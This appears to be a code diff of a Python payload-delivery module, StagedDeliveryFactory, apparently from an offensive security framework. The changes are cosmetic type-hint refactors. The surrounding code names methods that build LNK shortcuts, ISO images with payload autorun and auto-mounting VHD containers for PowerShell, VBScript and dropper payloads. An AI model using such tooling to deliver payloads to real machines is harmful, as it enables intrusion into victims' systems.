@@ -11,13 +11,11 @@ multiple payload formats (PowerShell, VBScript, JavaScript, binary droppers).
 from __future__ import annotations
 
 import base64
-import os
 import struct
-import tempfile
 import uuid
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from pathlib import Path
-from typing import Any, Optional
+from typing import Any
 
 SESSIONS_DIR = Path(__file__).resolve().parent.parent / "sessions"
 ISO_BLOCK_SIZE = 2048
@@ -82,7 +80,7 @@ class StagedDeliveryFactory:
         "WScript.Sleep 100:Loop"
     )
 
-    def __init__(self, config: Optional[StageDeliveryConfig] = None, output_dir: Optional[Path] = None):
+    def __init__(self, config: StageDeliveryConfig | None = None, output_dir: Path | None = None):
         self.config = config or StageDeliveryConfig()
         self.output_dir = Path(output_dir) if output_dir else SESSIONS_DIR / "delivery"
         self.output_dir.mkdir(parents=True, exist_ok=True)
@@ -320,7 +318,7 @@ End Sub
         full_lnk = struct.pack("<I", len(shell_link) + 4) + shell_link
         return full_lnk
 
-    def generate_iso(self, inner_files: Optional[dict[str, bytes]] = None) -> bytes:
+    def generate_iso(self, inner_files: dict[str, bytes] | None = None) -> bytes:
         """Generate an ISO 9660 image with an embedded payload autorun.
 
         Args:
@@ -389,7 +387,7 @@ End Sub
 
         return bytes(pvd)
 
-    def generate_vhd(self, inner_files: Optional[dict[str, bytes]] = None) -> bytes:
+    def generate_vhd(self, inner_files: dict[str, bytes] | None = None) -> bytes:
         """Generate a VHD (Virtual Hard Disk) image with embedded payloads.
 
         VHD files auto-mount on Windows 10+ when double-clicked, providing
